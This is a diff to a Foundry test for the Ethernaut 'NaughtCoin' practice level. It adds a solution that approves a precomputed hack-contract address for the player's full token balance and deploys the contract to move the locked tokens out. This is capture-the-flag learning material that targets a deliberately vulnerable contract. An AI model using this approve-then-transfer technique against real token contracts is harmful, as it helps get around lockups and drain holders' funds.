@@ -7,6 +7,7 @@ import "../src/Ethernaut.sol";
 import "../src/metrics/Statistics.sol";
 import "../src/levels/NaughtCoinFactory.sol";
 import "../src/levels/NaughtCoin.sol";
+import "../src/levels/NaughtCoinHack.sol";
 
 contract NaughtCoinTest is Test {
     using stdStorage for StdStorage;
@@ -61,6 +62,22 @@ contract NaughtCoinTest is Test {
         NaughtCoin instance = NaughtCoin(payable(instanceAddress));
 
         /* Level Hack */
+        uint256 balance = instance.balanceOf(eoa);
+        emit log_named_uint("balance", balance);
+        assertTrue(balance == instance.totalSupply());
+
+        uint256 nonce = vm.getNonce(address(eoa));
+        emit log_named_uint("nonce", nonce); // 0
+        address naughtCoinHackAddress = computeCreateAddress(eoa, nonce);
+        emit log_named_address("naughtCoinHackAddress", naughtCoinHackAddress);
+
+        instance.approve(naughtCoinHackAddress, balance);
+
+        NaughtCoinHack naughtCoinHack = new NaughtCoinHack(instanceAddress);
+
+        balance = instance.balanceOf(eoa);
+        emit log_named_uint("balance", balance);
+        assertTrue(balance == 0);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
